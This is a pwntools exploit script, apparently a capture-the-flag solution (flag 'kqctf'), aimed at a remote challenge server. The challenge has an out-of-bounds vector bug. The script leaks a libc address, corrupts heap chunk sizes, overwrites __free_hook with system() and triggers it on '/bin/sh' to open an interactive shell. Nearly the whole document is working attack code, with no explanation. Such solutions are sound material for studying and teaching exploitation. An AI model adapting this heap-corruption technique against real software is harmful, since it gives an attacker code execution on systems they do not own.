# kqctf{0ut_0f_b0unds_v3ct0rs_4r3_sp00ky}
from pwn import *

target = remote("143.198.184.186", 5004)
'''
elf = ELF("./vec")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")
target = process([ld.path, elf.path], env={"LD_PRELOAD": libc.path})
#'''

def s(d):
    global payload 
    payload += str(d) + "\n"

def create_array(n, q, nums):
    s(str(n) + " " + str(q))
    for i in range(n):
        s(nums)

payload = ""
T = 10
s(T)

# answer iterations start here
create_array(90, 1, 0x31)
s("1\n1\n" + str(0x31))

create_array(1, 1, 9008)
s("1\n0\n" + str(0x421))

create_array(1, 1, 0x31)
s("1\n0\n" + str(0x31))

create_array(1, 1, 9008)
s("0\n2")

target.sendline(payload)
payload = ""

libc_base = 0
libc_base = int(target.recvline().strip()) - 0x7fa598301fd0 + 0x7fa598143000
log.info("LIBC Base: " + hex(libc_base))

create_array(2, 1, 0x31)
s("1\n0 " + str(0x51))

create_array(2, 1, 0x31)
s("1\n1 " + str(0x31))

create_array(2, 1, 0x31)
s("1\n0 " + str(0x51))

#create_array(8, 1, libc_base + libc.sym['__free_hook'] - 0x10)
s(str(8) + " " + str(1))
s(u64(b"A"*8))
s(0x31)
s(0x31)
s(0x31)
# libc.sym['__free_hook'] --> 0x1c1e70
s(libc_base + 0x1c1e70 - 0x10)
s(0x31)
s(0x31)
s(0x31)
s("1\n0 " + str(0x71))

create_array(5, 1, libc_base + 0x1c1e70 - 0x70)
s("1\n0 " + str(0x71))

#create_array(5, 1, 0x31)
s(str(5) + " " + str(1))
s(u64(b"/bin/sh\x00"))
s(0)
# libc.sym['system'] --> 0x48e50
s(libc_base + 0x48e50)
s(0)
s(0)

target.sendline(payload)

target.interactive()